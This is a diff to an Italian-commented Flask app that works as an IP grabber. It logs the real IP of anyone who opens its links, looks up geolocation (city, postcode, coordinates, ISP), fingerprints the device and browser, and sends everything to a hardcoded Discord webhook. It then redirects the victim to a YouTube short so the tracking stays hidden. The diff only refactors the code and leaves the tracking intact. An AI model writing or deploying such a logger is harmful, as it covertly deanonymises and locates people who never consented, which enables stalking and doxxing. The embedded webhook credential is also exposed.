@@ -2,8 +2,8 @@ from flask import Flask, request, redirect
 from datetime import datetime
 import requests
 import os
-import json
-import base64
+import re
+import time
 
 app = Flask(__name__)
 
@@ -14,14 +14,12 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yB
 IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"
 
 def get_real_ip(request):
-    """Prende solo l'IP reale del client"""
     forwarded = request.headers.get('X-Forwarded-For', '')
     if forwarded:
         return forwarded.split(',')[0].strip()
     return request.remote_addr
 
 def get_ip_info(ip):
-    """Ottiene info geolocalizzazione complete"""
     try:
         response = requests.get(
             f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
@@ -53,7 +51,6 @@ def get_ip_info(ip):
     return None
 
 def get_device_info(request):
-    """Analizza User-Agent per info dispositivo"""
     ua = request.headers.get('User-Agent', '')
     
     info = {
@@ -82,7 +79,6 @@ def get_device_info(request):
         info["os"] = "Windows 7"
     elif 'Mac OS X' in ua:
         info["os"] = "macOS"
-        import re
         version = re.search(r'Mac OS X (\d+[._]\d+)', ua)
         if version:
             info["os_version"] = version.group(1).replace('_', '.')
@@ -91,15 +87,18 @@ def get_device_info(request):
     elif 'Android' in ua:
         info["os"] = "Android"
         info["is_mobile"] = True
+        info["device"] = "Mobile"
         version = re.search(r'Android (\d+\.\d+)', ua)
         if version:
             info["os_version"] = version.group(1)
     elif 'iPhone' in ua:
         info["os"] = "iOS (iPhone)"
         info["is_mobile"] = True
+        info["device"] = "Mobile"
     elif 'iPad' in ua:
         info["os"] = "iOS (iPad)"
         info["is_tablet"] = True
+        info["device"] = "Tablet"
     
     # Detect Browser
     if 'Edg/' in ua:
@@ -124,29 +123,26 @@ def get_device_info(request):
     return info
 
 def get_request_info(request):
-    """Raccoglie info sulla richiesta HTTP"""
     return {
         "method": request.method,
-        "url": request.url,
+        "url": str(request.url),
         "path": request.path,
         "host": request.host,
         "referrer": request.headers.get('Referer', 'N/D'),
         "accept_language": request.headers.get('Accept-Language', 'N/D'),
         "accept_encoding": request.headers.get('Accept-Encoding', 'N/D'),
         "connection": request.headers.get('Connection', 'N/D'),
-        "dnt": request.headers.get('DNT', 'N/D'),  # Do Not Track
+        "dnt": request.headers.get('DNT', 'N/D'),
         "cookies": len(request.cookies),
-        "content_type": request.headers.get('Content-Type', 'N/D'),
-        "protocol": request.environ.get('SERVER_PROTOCOL', 'N/D')
+        "content_type": request.headers.get('Content-Type', 'N/D')
     }
 
 def send_to_discord(ip, ip_info, device_info, request_info, route_name):
-    """Invia tutte le informazioni al webhook Discord in embed multipli"""
     date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
     
     # Embed 1: IP e Posizione
     embed1 = {
-        "title": "🌐 **Informazioni IP e Posizione**",
+        "title": "🌐 Informazioni IP e Posizione",
         "color": 5814783,
         "fields": [
             {"name": "🔢 IP", "value": f"`{ip}`", "inline": False}
@@ -157,7 +153,7 @@ def send_to_discord(ip, ip_info, device_info, request_info, route_name):
         embed1["fields"].extend([
             {"name": "🌍 Paese", "value": f"{ip_info.get('country', 'N/D')} ({ip_info.get('countryCode', 'N/D')})", "inline": True},
             {"name": "🏙️ Città", "value": f"{ip_info.get('city', 'N/D')}, {ip_info.get('region', 'N/D')}", "inline": True},
-            {"name": "📮 CAP", "value": ip_info.get('zip', 'N/D'), "inline": True},
+            {"name": "📮 CAP", "value": str(ip_info.get('zip', 'N/D')), "inline": True},
             {"name": "📍 Coordinate", "value": f"Lat: {ip_info.get('lat', 'N/D')}\nLon: {ip_info.get('lon', 'N/D')}", "inline": True},
             {"name": "🕐 Timezone", "value": ip_info.get('timezone', 'N/D'), "inline": True},
             {"name": "📱 Mobile", "value": "✅ Sì" if ip_info.get('mobile') else "❌ No", "inline": True},
@@ -167,7 +163,7 @@ def send_to_discord(ip, ip_info, device_info, request_info, route_name):
     
     # Embed 2: Connessione
     embed2 = {
-        "title": "🔌 **Informazioni Connessione**",
+        "title": "🔌 Informazioni Connessione",
         "color": 3447003,
         "fields": []
     }
@@ -182,7 +178,7 @@ def send_to_discord(ip, ip_info, device_info, request_info, route_name):
     
     # Embed 3: Dispositivo
     embed3 = {
-        "title": "💻 **Informazioni Dispositivo**",
+        "title": "💻 Informazioni Dispositivo",
         "color": 16776960,
         "fields": [
             {"name": "🖥️ Sistema Operativo", "value": f"{device_info.get('os', 'N/D')} {device_info.get('os_version', '')}", "inline": True},
@@ -196,13 +192,12 @@ def send_to_discord(ip, ip_info, device_info, request_info, route_name):
     
     # Embed 4: Richiesta HTTP
     embed4 = {
-        "title": "📡 **Dettagli Richiesta**",
+        "title": "📡 Dettagli Richiesta",
         "color": 10038562,
         "fields": [
             {"name": "🔗 Referrer", "value": request_info.get('referrer', 'N/D')[:100], "inline": False},
             {"name": "🛤️ Route", "value": route_name, "inline": True},
             {"name": "📋 Metodo", "value": request_info.get('method', 'N/D'), "inline": True},
-            {"name": "🔒 HTTPS", "value": "✅ Sì" if request.is_secure else "❌ No", "inline": True},
             {"name": "🚫 DNT", "value": request_info.get('dnt', 'N/D'), "inline": True},
             {"name": "🍪 Cookies", "value": str(request_info.get('cookies', 0)), "inline": True}
         ]
@@ -216,10 +211,9 @@ def send_to_discord(ip, ip_info, device_info, request_info, route_name):
     try:
         response = requests.post(WEBHOOK_URL, json=data)
         if response.status_code == 204:
-            print(f"✅ Inviato: {ip} | {ip_info.get('country', '?')} | {device_info.get('os', '?')}")
+            print(f"✅ Inviato: {ip}")
         elif response.status_code == 429:
             print(f"⚠️ Rate limit, riprovo...")
-            import time
             time.sleep(2)
             response = requests.post(WEBHOOK_URL, json=data)
         else:
@@ -227,22 +221,14 @@ def send_to_discord(ip, ip_info, device_info, request_info, route_name):
     except Exception as e:
         print(f"❌ Eccezione: {e}")
 
-def track_and_redirect(request, route_name, redirect_url="https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"):
-    """Funzione unificata per tracciare e reindirizzare"""
+@app.route("/")
+def index():
     ip = get_real_ip(request)
-    print(f"🎯 [{route_name}] IP: {ip}")
-    
     ip_info = get_ip_info(ip)
     device_info = get_device_info(request)
     request_info = get_request_info(request)
-    
-    send_to_discord(ip, ip_info, device_info, request_info, route_name)
-    
-    return redirect(redirect_url)
-
-@app.route("/")
-def index():
-    return track_and_redirect(request, "Home")
+    send_to_discord(ip, ip_info, device_info, request_info, "Home")
+    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
 
 @app.route("/img")
 @app.route("/image")
@@ -292,7 +278,12 @@ def image_tracker():
 @app.route("/watch")
 @app.route("/yt")
 def video_preview():
-    return track_and_redirect(request, "Video")
+    ip = get_real_ip(request)
+    ip_info = get_ip_info(ip)
+    device_info = get_device_info(request)
+    request_info = get_request_info(request)
+    send_to_discord(ip, ip_info, device_info, request_info, "Video")
+    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
